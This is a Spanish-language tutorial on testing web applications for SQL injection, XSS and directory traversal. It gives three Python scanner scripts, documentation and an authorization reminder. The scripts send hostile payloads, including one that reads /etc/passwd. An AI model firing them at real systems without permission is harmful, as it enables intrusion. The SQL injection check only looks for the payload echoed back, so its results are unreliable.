# **Identificar Vulnerabilidades en Aplicaciones Web**



## 1. **Detección de Inyección SQL (SQL Injection)**

**Descripción de la Vulnerabilidad:** La inyección SQL ocurre cuando una aplicación web no valida adecuadamente la entrada del usuario, permitiendo que se inserten comandos SQL maliciosos que pueden manipular la base de datos.

**Script de Ejemplo en Python:**

```python
import requests

def test_sql_injection(url, param):
    """
    Prueba si un parámetro en una URL es vulnerable a inyección SQL.
    
    :param url: URL de la aplicación web con el parámetro vulnerable.
    :param param: Nombre del parámetro a probar.
    """
    # Carga útil de prueba para detectar inyección SQL
    payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' ({"]
    
    for payload in payloads:
        # Construir la URL con el payload
        injection_url = f"{url}?{param}={payload}"
        response = requests.get(injection_url)
        
        # Verificar si la carga útil está presente en la respuesta
        if payload in response.text:
            print(f"Posible vulnerabilidad SQL Injection detectada con payload: {payload}")
        else:
            print(f"Payload '{payload}' no detectó vulnerabilidad.")

# Ejemplo de uso
if __name__ == "__main__":
    target_url = "http://example.com/vulnerable_page.php"
    vulnerable_param = "id"
    test_sql_injection(target_url, vulnerable_param)
```

**Documentación del Script:**

- **Importaciones:**
  - `requests`: Biblioteca para realizar solicitudes HTTP.
- **Función `test_sql_injection`:**
  - Parámetros:
    - `url`: La URL de la página web que se va a probar.
    - `param`: El nombre del parámetro que se sospecha está vulnerable.
  - Funcionamiento:
    - Define una lista de cargas útiles (payloads) comunes utilizadas para detectar inyecciones SQL.
    - Itera sobre cada payload, construye una URL con el payload inyectado en el parámetro especificado.
    - Realiza una solicitud GET a la URL modificada.
    - Verifica si el payload está presente en la respuesta, lo que podría indicar una vulnerabilidad.
    - Imprime el resultado de la prueba.

**Consideraciones Éticas:** Este script debe utilizarse únicamente en aplicaciones web para las cuales se tiene autorización explícita para realizar pruebas de seguridad.

## 2. **Detección de Cross-Site Scripting (XSS)**

**Descripción de la Vulnerabilidad:** El Cross-Site Scripting (XSS) ocurre cuando una aplicación web permite la inserción de scripts maliciosos en las páginas vistas por otros usuarios, lo que puede llevar al robo de información, sesiones, etc.

**Script de Ejemplo en Python:**

```python
import requests

def test_xss(url, param):
    """
    Prueba si un parámetro en una URL es vulnerable a Cross-Site Scripting (XSS).
    
    :param url: URL de la aplicación web con el parámetro vulnerable.
    :param param: Nombre del parámetro a probar.
    """
    # Carga útil de prueba para detectar XSS
    payload = "<script>alert('XSS')</script>"
    
    # Construir la URL con el payload
    xss_url = f"{url}?{param}={payload}"
    response = requests.get(xss_url)
    
    # Verificar si el payload está presente en la respuesta
    if payload in response.text:
        print("Posible vulnerabilidad XSS detectada.")
    else:
        print("No se detectó vulnerabilidad XSS con el payload proporcionado.")

# Ejemplo de uso
if __name__ == "__main__":
    target_url = "http://example.com/search"
    vulnerable_param = "query"
    test_xss(target_url, vulnerable_param)
```

**Documentación del Script:**

- **Importaciones:**
  - `requests`: Biblioteca para realizar solicitudes HTTP.
- **Función `test_xss`:**
  - Parámetros:
    - `url`: La URL de la página web que se va a probar.
    - `param`: El nombre del parámetro que se sospecha está vulnerable.
  - Funcionamiento:
    - Define una carga útil (payload) comúnmente utilizada para detectar XSS.
    - Construye una URL con el payload inyectado en el parámetro especificado.
    - Realiza una solicitud GET a la URL modificada.
    - Verifica si el payload está presente en la respuesta, lo que podría indicar una vulnerabilidad.
    - Imprime el resultado de la prueba.

**Consideraciones Éticas:** Este script debe utilizarse únicamente en aplicaciones web para las cuales se tiene autorización explícita para realizar pruebas de seguridad.

## 3. **Detección de Traversal de Directorios (Directory Traversal)**

**Descripción de la Vulnerabilidad:** El Directory Traversal permite a un atacante acceder a archivos y directorios que están fuera del directorio raíz de la aplicación web, potencialmente exponiendo información sensible.

**Script de Ejemplo en Python:**

```python
import requests

def test_directory_traversal(url, param):
    """
    Prueba si un parámetro en una URL es vulnerable a Directory Traversal.
    
    :param url: URL de la aplicación web con el parámetro vulnerable.
    :param param: Nombre del parámetro a probar.
    """
    # Carga útil de prueba para detectar Directory Traversal
    payloads = ["../", "..\\", "../../../etc/passwd"]
    
    for payload in payloads:
        # Construir la URL con el payload
        traversal_url = f"{url}?{param}={payload}"
        response = requests.get(traversal_url)
        
        # Verificar si alguna cadena de caracteres de archivos sensibles está presente en la respuesta
        if "root:" in response.text or "passwd" in response.text:
            print(f"Posible vulnerabilidad Directory Traversal detectada con payload: {payload}")
            break
    else:
        print("No se detectó vulnerabilidad Directory Traversal con los payloads proporcionados.")

# Ejemplo de uso
if __name__ == "__main__":
    target_url = "http://example.com/view"
    vulnerable_param = "file"
    test_directory_traversal(target_url, vulnerable_param)
```

**Documentación del Script:**

- **Importaciones:**
  - `requests`: Biblioteca para realizar solicitudes HTTP.
- **Función `test_directory_traversal`:**
  - Parámetros:
    - `url`: La URL de la página web que se va a probar.
    - `param`: El nombre del parámetro que se sospecha está vulnerable.
  - Funcionamiento:
    - Define una lista de cargas útiles (payloads) utilizadas para detectar Directory Traversal.
    - Itera sobre cada payload, construye una URL con el payload inyectado en el parámetro especificado.
    - Realiza una solicitud GET a la URL modificada.
    - Verifica si en la respuesta se encuentran cadenas de caracteres que indican la exposición de archivos sensibles (por ejemplo, "root:" en `/etc/passwd` en sistemas Unix).
    - Imprime el resultado de la prueba.

**Consideraciones Éticas:** Este script debe utilizarse únicamente en aplicaciones web para las cuales se tiene autorización explícita para realizar pruebas de seguridad.

## Buenas Prácticas al Desarrollar Scripts para Pruebas de Seguridad

- **Autorización:** Siempre asegúrate de tener permiso explícito para realizar pruebas de seguridad en cualquier aplicación web.
- **Entorno Controlado:** Realiza pruebas en entornos de desarrollo o pruebas, nunca en sistemas de producción sin consentimiento.
- **Responsabilidad:** Informa de manera responsable cualquier vulnerabilidad encontrada a los propietarios de la aplicación web.
- **Actualización Constante:** Las vulnerabilidades y las técnicas de mitigación evolucionan constantemente. Mantente actualizado con las últimas tendencias y mejores prácticas en seguridad web.
- **Documentación:** Documenta claramente tus hallazgos y los pasos realizados durante las pruebas para facilitar la remediación y la comprensión.